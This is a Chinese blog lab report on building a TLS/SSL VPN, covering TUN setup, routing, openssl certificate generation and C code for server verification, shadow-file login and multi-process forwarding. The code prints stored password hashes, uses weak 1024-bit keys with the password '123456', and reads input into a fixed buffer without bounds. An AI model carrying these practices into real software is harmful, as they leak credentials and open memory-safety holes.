    <content type="html"><![CDATA[<h2 id="TLS-SSL-VPN设计基础"><a href="#TLS-SSL-VPN设计基础" class="headerlink" title="TLS/SSL VPN设计基础"></a>TLS/SSL VPN设计基础</h2><ul><li>VPN</li><li>TUN/TAP接口</li><li>路由</li><li>PKI相关</li><li>TLS/SSL加密</li></ul><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><h3 id="task-1：设置虚拟机"><a href="#task-1：设置虚拟机" class="headerlink" title="task 1：设置虚拟机"></a>task 1：设置虚拟机</h3><table><thead><tr><th align="center">VPN Client/Host U</th><th align="center">10.0.2.4</th></tr></thead><tbody><tr><td align="center"><strong>Gateway</strong></td><td align="center"><strong>10.0.2.5、192.168.60.1</strong></td></tr><tr><td align="center"><strong>Host V</strong></td><td align="center"><strong>192.168.60.101</strong></td></tr></tbody></table><p><img src="/2020/12/22/VPN/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><p>在建立VPN隧道之前，可以看到U是无法ping V的</p><h3 id="task-2：通过TUN-TAP建立VPN隧道"><a href="#task-2：通过TUN-TAP建立VPN隧道" class="headerlink" title="task 2：通过TUN/TAP建立VPN隧道"></a>task 2：通过TUN/TAP建立VPN隧道</h3><p><img src="/2020/12/22/VPN/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><h4 id="step-1：运行VPN-server"><a href="#step-1：运行VPN-server" class="headerlink" title="step 1：运行VPN server"></a>step 1：运行VPN server</h4><p>在Gateway上面按照步骤运行相关命令，之后可以看到对于tun0接口的配置如下，已经有了IP地址<code>192.168.53.1</code></p><p><img src="/2020/12/22/VPN/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><h4 id="step-2：运行VPN-client"><a href="#step-2：运行VPN-client" class="headerlink" title="step 2：运行VPN client"></a>step 2：运行VPN client</h4><p>和上面基本一样</p><p><img src="/2020/12/22/VPN/2-4.PNG" srcset="/img/loading.gif" alt="2-4"></p><h4 id="step-3：在client和server端建立路由"><a href="#step-3：在client和server端建立路由" class="headerlink" title="step 3：在client和server端建立路由"></a>step 3：在client和server端建立路由</h4><p>配置好的路由表应该如下</p><ul><li><strong>client端</strong></li></ul><p><img src="/2020/12/22/VPN/2-5.PNG" srcset="/img/loading.gif" alt="2-5"></p><ul><li><strong>server端</strong></li></ul><p><img src="/2020/12/22/VPN/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><h4 id="step-4：设置V的路由"><a href="#step-4：设置V的路由" class="headerlink" title="step 4：设置V的路由"></a>step 4：设置V的路由</h4><p>根据对于整个发包流程的认识，其实在这一步我们所需要添加的就是如果包的目的IP是192.168.53.0/24的主机，需要通过<code>enp0s8</code>来发往<code>192.168.60.1</code>，这样当<code>Gateway</code>收到来自<code>host V</code>的回复之后，会通过<code>192.168.53.1</code>端口来进行转发数据包。</p><p><code>host V</code>路由表设置完之后如下</p><p><img src="/2020/12/22/VPN/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p><h4 id="step-5：测试VPN"><a href="#step-5：测试VPN" class="headerlink" title="step 5：测试VPN"></a>step 5：测试VPN</h4><p>首先是terminal上面的显示</p><p><img src="/2020/12/22/VPN/2-8.PNG" srcset="/img/loading.gif" alt="2-8"></p><p>可以看到是能够ping通的，之后来分析wireshark</p><p><img src="/2020/12/22/VPN/2-9.PNG" srcset="/img/loading.gif" alt="2-9"></p><p>其中，ICMP类型的包不是隧道流量，而在<code>10.0.2.4</code>和<code>10.0.2.5</code>之间流动的是隧道流量</p><p>同理，telnet的命令也是如此</p><p><img src="/2020/12/22/VPN/2-10.PNG" srcset="/img/loading.gif" alt="2-10">)<img src="/2020/12/22/VPN/2-11.PNG" srcset="/img/loading.gif" alt="2-11"></p><h4 id="step-6：破洞实验"><a href="#step-6：破洞实验" class="headerlink" title="step 6：破洞实验"></a>step 6：破洞实验</h4><p>当我们在保持telnet连接的时候停止运行vpnclient，此时输入的命令不会显示出来，连接断开</p><p><img src="/2020/12/22/VPN/2-12.PNG" srcset="/img/loading.gif" alt="2-12"></p><p>但是当我们重新建立连接的时候，会显示之前输入的字符串</p><p><img src="/2020/12/22/VPN/2-13.PNG" srcset="/img/loading.gif" alt="2-13"></p><h3 id="task-3：隧道加密"><a href="#task-3：隧道加密" class="headerlink" title="task 3：隧道加密"></a>task 3：隧道加密</h3><p>要保护隧道的完整性以及机密性，其中机密性是通过加密来实现的，完整性可以通过MAC来确保，参考：<a href="https://www.jianshu.com/p/9616b2d29954" target="_blank" rel="noopener">消息认证码MAC</a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先，直接用是不行的，因为<code>server-key.pem</code>证书过期，但是又不知道<code>cacert.pem</code>的密码，所以不能用原来的<code>cacert.pem</code>来为服务端重新签名一个证书，所以只能是自己生成一个根证书，之后再用自己的根证书给服务器签名，在这里，我们将服务端的域名命名为<code>jhlvpn.com</code></p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>在<code>cert_server</code>文件夹中</p><ul><li>首先生成自签名的根证书<code>cacert.pem</code>，运行命令</li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">openssl</span> <span class="hljs-selector-tag">req</span> <span class="hljs-selector-tag">-new</span> <span class="hljs-selector-tag">-x509</span> <span class="hljs-selector-tag">-keyout</span> <span class="hljs-selector-tag">cakey</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-out</span> <span class="hljs-selector-tag">cacert</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-config</span> <span class="hljs-selector-tag">openssl</span><span class="hljs-selector-class">.cnf</span> <span class="hljs-selector-tag">-days</span> 3650</code></pre><p>之后需要设定文件密码，为<code>123456</code>，然后填写相关内容</p><p><img src="/2020/12/22/VPN/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>会生成<code>cacert.pem</code>文件和<code>cakey.pem</code>，即CA的证书文件和私钥</p><ul><li>之后，服务器产生一对私钥，采用des3加密</li></ul><pre><code class="hljs angelscript">openssl genrsa -des3 -<span class="hljs-keyword">out</span> server-key.pem <span class="hljs-number">1024</span></code></pre><p>文件密码还是<code>123456</code></p><ul><li>然后根据证书生成证书请求文件<code>server-csr.pem</code></li></ul><pre><code class="hljs pgsql">openssl req -<span class="hljs-built_in">new</span> -key <span class="hljs-keyword">server</span>-key.pem -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>-csr.pem -config openssl.cnf</code></pre><p><img src="/2020/12/22/VPN/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><ul><li>生成服务端签名证书</li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">openssl</span> <span class="hljs-selector-tag">ca</span> <span class="hljs-selector-tag">-in</span> <span class="hljs-selector-tag">server-csr</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-out</span> <span class="hljs-selector-tag">server-cert</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-cert</span> <span class="hljs-selector-tag">cacert</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-keyfile</span> <span class="hljs-selector-tag">cakey</span><span class="hljs-selector-class">.pem</span><span class="hljs-selector-tag">-config</span> <span class="hljs-selector-tag">openssl</span><span class="hljs-selector-class">.cnf</span> <span class="hljs-selector-tag">-days</span> 3650</code></pre><ul><li><p>之后把<code>cacert.pem</code>文件复制到<code>ca_client</code>文件夹下面</p></li><li><p>之后生成散列值并且利用散列值创建符号链接</p></li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">openssl</span> <span class="hljs-selector-tag">x509</span> <span class="hljs-selector-tag">-in</span> <span class="hljs-selector-tag">cacert</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-noout</span> <span class="hljs-selector-tag">-subject_hash</span><span class="hljs-selector-tag">ln</span> <span class="hljs-selector-tag">-s</span> <span class="hljs-selector-tag">cacert</span><span class="hljs-selector-class">.pem</span> 3<span class="hljs-selector-tag">de75e64</span><span class="hljs-selector-class">.0</span></code></pre><p>之后运行程序，成功</p><ul><li><strong>server端</strong></li></ul><p><img src="/2020/12/22/VPN/3-4.PNG" srcset="/img/loading.gif" alt="3-4"></p><ul><li><strong>client端</strong></li></ul><p><img src="/2020/12/22/VPN/3-5.PNG" srcset="/img/loading.gif" alt="3-5"></p><p>同时，对wireshark抓包结果进行分析</p><p><img src="/2020/12/22/VPN/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p><p>首先，能明显看到TCP连接建立的握手过程（SYN、ACK包）、数据传输的过程以及断开连接的过程（FIN、ACK包），同时随便选择一个数据包，分析Data字段，可以看到是加密传输，不是明文传输</p><p><img src="/2020/12/22/VPN/3-6.PNG" srcset="/img/loading.gif" alt="3-6"></p><h3 id="task-4：VPN服务器验证"><a href="#task-4：VPN服务器验证" class="headerlink" title="task 4：VPN服务器验证"></a>task 4：VPN服务器验证</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>在建立VPN之前，要对VPN服务器进行验证，是通过使用公钥证书的方式来实现的</p><p>具体分为三部：1.首先要验证服务器证书有效 2.验证服务器是证书的所有者 3.验证服务器是目标服务器</p><h4 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h4><ul><li><p><strong>指出执行上述验证的代码行</strong></p><p>  首先，验证部分包括服务端发送服务器证书以及客户端对于证书的验证过程</p><p>  <strong>server</strong></p></li></ul><pre><code class="hljs c"><span class="hljs-comment">// Step 0: OpenSSL library initialization </span><span class="hljs-comment">// This step is no longer needed as of version 1.1.0.</span>SSL_library_init();<span class="hljs-comment">//进行协议初始化工作</span>SSL_load_error_strings();<span class="hljs-comment">//加载错误信息</span>SSLeay_add_ssl_algorithms();<span class="hljs-comment">//添加SSL加密算法</span><span class="hljs-comment">// Step 1: SSL context initialization</span>meth = (SSL_METHOD *)TLSv1_2_method();ctx = SSL_CTX_new(meth);<span class="hljs-comment">//创建会话环境</span>SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//指定握手阶段的证书验证方式，SSL_VERIFY_NONE表示完全忽略验证证书的结果</span><span class="hljs-comment">// Step 2: Set up the server certificate and private key</span>SSL_CTX_use_certificate_file(ctx, <span class="hljs-string">"./cert_server/server-cert.pem"</span>, SSL_FILETYPE_PEM);SSL_CTX_use_PrivateKey_file(ctx, <span class="hljs-string">"./cert_server/server-key.pem"</span>, SSL_FILETYPE_PEM);<span class="hljs-comment">//加载服务端证书和私钥</span><span class="hljs-comment">// Step 3: Create a new SSL structure for a connection</span>ssl = SSL_new (ctx);</code></pre><p>​    <strong>client</strong></p><pre><code class="hljs c"><span class="hljs-function">SSL* <span class="hljs-title">setupTLSClient</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* hostname)</span></span><span class="hljs-function"></span>&#123;   <span class="hljs-comment">// Step 0: OpenSSL library initialization </span>   <span class="hljs-comment">// This step is no longer needed as of version 1.1.0.</span>   SSL_library_init();   SSL_load_error_strings();   SSLeay_add_ssl_algorithms();   SSL_METHOD *meth;   SSL_CTX* ctx;   SSL* ssl;   meth = (SSL_METHOD *)TLSv1_2_method();   ctx = SSL_CTX_new(meth);   SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//SSL_VERIFY_PEER表示希望验证对方证书</span>   <span class="hljs-keyword">if</span>(SSL_CTX_load_verify_locations(ctx,<span class="hljs-literal">NULL</span>, CA_DIR) &lt; <span class="hljs-number">1</span>)&#123;<span class="hljs-comment">//SSL_CTX_load_verify_locations为CA证书所在目录，这里实现了上面所说的步骤一对于服务器证书的验证：利用CA_DIR目录下面的CA证书去验证服务器证书是否有效</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error setting the verify locations. \n"</span>);<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);   &#125;   ssl = SSL_new (ctx);   X509_VERIFY_PARAM *vpm = SSL_get0_param(ssl);    X509_VERIFY_PARAM_set1_host(vpm, hostname, <span class="hljs-number">0</span>);<span class="hljs-comment">//实现步骤三对于hostname的验证，检查服务器hostname</span>   <span class="hljs-keyword">return</span> ssl;&#125;</code></pre><p>而第二步的检查在验证证书合法性的时候就已经验证了</p><h3 id="task-5：VPN客户端验证"><a href="#task-5：VPN客户端验证" class="headerlink" title="task 5：VPN客户端验证"></a>task 5：VPN客户端验证</h3><p>在这一个task当中，我们需要对VPN客户端进行验证，client会向server端发送username和password，之后server端通过shadow文件匹配来验证对方身份</p><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>在server端加入对用户信息的请求，用户在终端上输入username以及password，参考文档的3.3节</p><h4 id="具体实现-2"><a href="#具体实现-2" class="headerlink" title="具体实现"></a>具体实现</h4><ul><li>在server端添加<code>loginrequest()</code>函数，以及通过<code>login()</code>来进行信息的验证</li></ul><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">loginRequest</span><span class="hljs-params">(SSL* ssl,<span class="hljs-keyword">int</span> sock)</span></span>&#123;    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<span class="hljs-keyword">char</span> username[<span class="hljs-number">1024</span>];<span class="hljs-keyword">char</span> password[<span class="hljs-number">1024</span>];    <span class="hljs-comment">//将请求用户名的语句SSL_write到Client,从client端读取到的后面的输入字符串SSL_read到username</span><span class="hljs-keyword">char</span>* requsr = <span class="hljs-string">"Please enter username:"</span>;SSL_write(ssl,requsr,<span class="hljs-built_in">strlen</span>(requsr));<span class="hljs-keyword">int</span> usrlen = SSL_read(ssl,username,<span class="hljs-keyword">sizeof</span>(username)<span class="hljs-number">-1</span>);username[usrlen] = <span class="hljs-string">'\0'</span>;    <span class="hljs-comment">//将请求用户口令的语句SSL_write到Client,从client端读取到的输入字符串SSL_read到 password</span><span class="hljs-keyword">char</span>* reqpsd = <span class="hljs-string">"Please enter password:"</span>;SSL_write(ssl,reqpsd,<span class="hljs-built_in">strlen</span>(reqpsd));<span class="hljs-keyword">int</span> psdlen = SSL_read(ssl,password,<span class="hljs-keyword">sizeof</span>(password)<span class="hljs-number">-1</span>);password[psdlen] = <span class="hljs-string">'\0'</span>;    login(username,password); <span class="hljs-comment">//检查shadow文件中是否有该用户的信息</span>&#125;</code></pre><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">login</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *user, <span class="hljs-keyword">char</span> *passwd)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spwd</span> *<span class="hljs-title">pw</span>;</span><span class="hljs-keyword">char</span> *epasswd;pw = getspnam(user);<span class="hljs-keyword">if</span> (pw == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Login name: %s\n"</span>, pw-&gt;sp_namp);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Passwd : %s\n"</span>, pw-&gt;sp_pwdp);epasswd = crypt(passwd, pw-&gt;sp_pwdp);<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(epasswd, pw-&gt;sp_pwdp)) &#123;<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;&#125;</code></pre><p>对<code>main()</code>函数中只需要在处理client的GET请求的<code>processRequest()</code>函数之前加上<code>loginrequest()</code>即可</p><ul><li>client端在收到来自于server端的用户信息的请求之后，就直接<code>scanf()</code>输入即可，但是要求用户密码不可见，就用<code>getpass()</code>函数即可</li></ul><pre><code class="hljs c"><span class="hljs-built_in">printf</span> (<span class="hljs-string">"SSL connection using %s\n"</span>, SSL_get_cipher(ssl));<span class="hljs-comment">/*----------------Send username &amp; password-------------*/</span><span class="hljs-keyword">int</span> len1;<span class="hljs-keyword">char</span> username[<span class="hljs-number">20</span>];<span class="hljs-keyword">char</span>* password;<span class="hljs-keyword">char</span> usrbuf[<span class="hljs-number">1000</span>];<span class="hljs-keyword">char</span> pwdbuf[<span class="hljs-number">1000</span>];len1 = SSL_read (ssl, usrbuf, <span class="hljs-keyword">sizeof</span>(usrbuf)<span class="hljs-number">-1</span>);<span class="hljs-comment">//SSL_read来获取Server的请求用户名的信息</span>usrbuf[len1] = <span class="hljs-string">'\0'</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, usrbuf);<span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s:"</span>,username);SSL_write (ssl,username,<span class="hljs-built_in">strlen</span>(username));<span class="hljs-comment">//将username通过SSL_write到Server</span>len1 = SSL_read (ssl, pwdbuf, <span class="hljs-keyword">sizeof</span>(pwdbuf)<span class="hljs-number">-1</span>);<span class="hljs-comment">//SSL_read到Server的请求用户口令的信息</span>pwdbuf[len1] = <span class="hljs-string">'\0'</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, pwdbuf);password = getpass(<span class="hljs-string">""</span>);SSL_write(ssl,password,<span class="hljs-built_in">strlen</span>(password));<span class="hljs-comment">//将password SSL_write到Server</span><span class="hljs-comment">/*----------------Send/Receive data --------------------*/</span></code></pre><p>运行结果如下：</p><p><strong>client端</strong></p><p><img src="/2020/12/22/VPN/5-3.PNG" srcset="/img/loading.gif" alt="5-3"></p><p><strong>server端</strong></p><p><img src="/2020/12/22/VPN/5-1.PNG" srcset="/img/loading.gif" alt="5-1"></p><p>而当我们没有正确的输入用户名和密码的时候，用户端会直接退出</p><p><img src="/2020/12/22/VPN/5-4.PNG" srcset="/img/loading.gif" alt="5-4"></p><h3 id="task-6：支持多进程"><a href="#task-6：支持多进程" class="headerlink" title="task 6：支持多进程"></a>task 6：支持多进程</h3><p><img src="/2020/12/22/VPN/6-1.PNG" srcset="/img/loading.gif" alt="6-1"></p><p>在之前的task当中，我们只是实现了数据的加密传输（SSL），但是还没有完全的实现VPN，因为没用通过使用TUN接口来构建VPN隧道，所以接下来我们实际要实现的就是在多进程的条件下来实现我们对于TUN接口的使用</p><ul><li><strong>client端</strong></li></ul><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">createTunDevice</span><span class="hljs-params">()</span> </span><span class="hljs-function"></span>&#123;<span class="hljs-comment">//该函数的作用就是新建一个tun接口并且返回对应的文件描述符，无需修改，直接加到tlsclient即可</span>   <span class="hljs-keyword">int</span> tunfd;   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span>   <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));   ifr.ifr_flags = IFF_TUN | IFF_NO_PI;     tunfd = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/dev/net/tun"</span>, O_RDWR);   ioctl(tunfd, TUNSETIFF, &amp;ifr);          <span class="hljs-keyword">return</span> tunfd;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tunSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, SSL* ssl)</span></span>&#123;<span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from TUN\n"</span>);    bzero(buff, BUFF_SIZE);len = <span class="hljs-built_in">read</span>(tunfd, buff, BUFF_SIZE);<span class="hljs-comment">//read函数将从tunfd当中的数据读取到buff当中</span><span class="hljs-comment">//sendto(sockfd, buff, len, 0, (struct sockaddr *) &amp;peerAddr,sizeof(peerAddr));</span>SSL_write(ssl,buff,len);<span class="hljs-comment">//写给ssl套接字</span>&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">socketSelected</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, SSL* ssl)</span></span>&#123;<span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from the tunnel\n"</span>);    bzero(buff, BUFF_SIZE);<span class="hljs-comment">//len = recvfrom(sockfd, buff, BUFF_SIZE, 0, NULL, NULL);</span>len = SSL_read(ssl,buff,<span class="hljs-keyword">sizeof</span>(buff)<span class="hljs-number">-1</span>);<span class="hljs-built_in">write</span>(tunfd, buff, len);<span class="hljs-comment">//写给tunfd来进行外层的解包</span>&#125;</code></pre><ul><li><strong>server端</strong>，所需要的函数和上面基本一样，在main里面的修改如下</li></ul><pre><code class="hljs c"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;    <span class="hljs-keyword">int</span> sock = accept(listen_sock, (struct sockaddr*)&amp;sa_client, &amp;client_len);    <span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// The child process</span>       <span class="hljs-built_in">close</span> (listen_sock);       SSL_set_fd (ssl, sock);       <span class="hljs-keyword">int</span> err = SSL_accept (ssl);       CHK_SSL(err);       <span class="hljs-built_in">printf</span> (<span class="hljs-string">"SSL connection established!\n"</span>);       loginrequest(ssl, sock);       processRequest(ssl, sock);       <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;          fd_set readFDSet;          FD_ZERO(&amp;readFDSet);          FD_SET(sock, &amp;readFDSet);          FD_SET(tunfd, &amp;readFDSet);          select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);          <span class="hljs-keyword">if</span> (FD_ISSET(tunfd, &amp;readFDSet)) tunSelected(tunfd, ssl);          <span class="hljs-keyword">if</span> (FD_ISSET(sock, &amp;readFDSet)) socketSelected(tunfd, ssl);       &#125;       <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// The parent process</span>        <span class="hljs-built_in">close</span>(sock);    &#125;  &#125;</code></pre><p>之后就按照task 2的一些步骤来弄就行</p><h4 id="pipe实现"><a href="#pipe实现" class="headerlink" title="pipe实现"></a>pipe实现</h4><p>在pipe的是相当中，会区分父子进程，父进程负责将从tun接口收到的数据发给子进程，而子进程有两种情况要处理，第一种是将来自父进程的数据通过通过ssl/tls发给客户端进程，第二种是将来自于客户端的程序传递给tun接口</p><p>具体实现</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tunPipeSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> pipefd)</span> </span>&#123;    <span class="hljs-comment">//该函数的作用是实现父进程的作用，从tun接口通过read来把数据读取到pipe的输出端口上</span><span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from TUN Interface\n"</span>);    bzero(buff, BUFF_SIZE);len = <span class="hljs-built_in">read</span>(tunfd, buff, BUFF_SIZE);buff[len] = <span class="hljs-string">'\0'</span>;<span class="hljs-built_in">write</span>(pipefd, buff, len);&#125;</code></pre><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pipeSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pipefd, <span class="hljs-keyword">int</span> sockfd, SSL *ssl)</span> </span>&#123;    <span class="hljs-comment">//该函数的作用是实现子进程从父进程通过pipe来得到的数据写入到ssl的socket上</span><span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from TUN Interface\n"</span>);    bzero(buff, BUFF_SIZE);len = <span class="hljs-built_in">read</span>(pipefd, buff, BUFF_SIZE);buff[len] = <span class="hljs-string">'\0'</span>;SSL_write(ssl, buff, len);&#125;</code></pre><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">socketSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pipefd, <span class="hljs-keyword">int</span> sockfd, SSL *ssl, <span class="hljs-keyword">int</span> tunfd)</span> </span>&#123;    <span class="hljs-comment">//该函数的作用是将来自客户端的程序发给了</span><span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-keyword">char</span> *ptr = buff;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from the tunnel established \n"</span>);    bzero(buff, BUFF_SIZE);len = SSL_read(ssl, buff, BUFF_SIZE);buff[len] = <span class="hljs-string">'\0'</span>;<span class="hljs-built_in">write</span>(tunfd, buff, len);&#125;</code></pre><p>对于<code>main()</code>函数的修改</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;SSL_METHOD *meth;SSL_CTX* ctx;SSL *ssl;<span class="hljs-keyword">int</span> err;    <span class="hljs-comment">// Step 0: OpenSSL library initialization</span><span class="hljs-comment">// This step is no longer needed as of version 1.1.0.</span>SSL_library_init();SSL_load_error_strings();SSLeay_add_ssl_algorithms();    <span class="hljs-comment">// Step 1: SSL context initialization</span>meth = (SSL_METHOD *)TLSv1_2_method();ctx = SSL_CTX_new(meth);SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, <span class="hljs-literal">NULL</span>);    <span class="hljs-comment">// Step 2: Set up the server certificate and private key</span>SSL_CTX_use_certificate_file(ctx, <span class="hljs-string">"./cert_server/server-cert.pem"</span>,SSL_FILETYPE_PEM);SSL_CTX_use_PrivateKey_file(ctx, <span class="hljs-string">"./cert_server/server-key.pem"</span>,SSL_FILETYPE_PEM);    <span class="hljs-comment">// Step 3: Create a new SSL structure for a connection</span>ssl = SSL_new (ctx);<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sa_client</span>;</span><span class="hljs-keyword">size_t</span> client_len;<span class="hljs-keyword">int</span> tunfd = createTunDevice();<span class="hljs-keyword">int</span> listen_sock = setupTCPServer();    <span class="hljs-keyword">int</span> fd[<span class="hljs-number">2</span>];<span class="hljs-comment">//pipe输入端和pipe输出端</span><span class="hljs-keyword">pid_t</span> pid;    pipe(fd);pid = fork();<span class="hljs-comment">//fork子进程，pid为子进程id</span><span class="hljs-keyword">if</span>(pid==<span class="hljs-number">-1</span>)&#123;perror(<span class="hljs-string">"fork"</span>);<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);&#125;<span class="hljs-keyword">if</span>(pid&gt;<span class="hljs-number">0</span>)&#123;<span class="hljs-built_in">close</span>(fd[<span class="hljs-number">0</span>]);<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;fd_set readFDSet;FD_ZERO(&amp;readFDSet);FD_SET(tunfd, &amp;readFDSet);select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-keyword">if</span> (FD_ISSET(tunfd, &amp;readFDSet)) tunPipeSelected(tunfd, fd[<span class="hljs-number">1</span>]);&#125;<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-built_in">close</span>(fd[<span class="hljs-number">1</span>]);<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">int</span> sock = accept(listen_sock, (struct sockaddr*)&amp;sa_client, &amp;client_len);<span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// The child process</span><span class="hljs-built_in">close</span> (listen_sock);            SSL_set_fd (ssl, sock);<span class="hljs-keyword">int</span> err = SSL_accept (ssl);CHK_SSL(err);<span class="hljs-built_in">printf</span> (<span class="hljs-string">"SSL connection established in child process!\n"</span>);loginRequest(ssl,sock);processRequest(ssl, sock);<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;fd_set readFDSet;                FD_ZERO(&amp;readFDSet);FD_SET(sock, &amp;readFDSet);FD_SET(fd[<span class="hljs-number">0</span>], &amp;readFDSet);                select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-keyword">if</span> (FD_ISSET(fd[<span class="hljs-number">0</span>],&amp;readFDSet)) pipeSelected(fd[<span class="hljs-number">0</span>], sock, ssl);<span class="hljs-keyword">if</span> (FD_ISSET(sock, &amp;readFDSet)) socketSelected(fd[<span class="hljs-number">0</span>],sock,ssl,tunfd);&#125;&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// The parent process</span><span class="hljs-built_in">close</span>(sock);&#125;&#125;&#125;&#125;</code></pre><p>并且此时并不需要在单线程的时候所写的<code>socketSelecct()</code>和<code>tunSelect()</code>，</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;TLS-SSL-VPN设计基础&quot;&gt;&lt;a href=&quot;#TLS-SSL-VPN设计基础&quot; class=&quot;headerlink&quot; title=&quot;TLS/SSL VPN设计基础&quot;&gt;&lt;/a&gt;TLS/SSL VPN设计基础&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;VPN&lt;/li&gt;
&lt;li</summary>
      
    
    
    
    
    <category term="Network Security" scheme="http://yoursite.com/tags/Network-Security/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入实验</title>
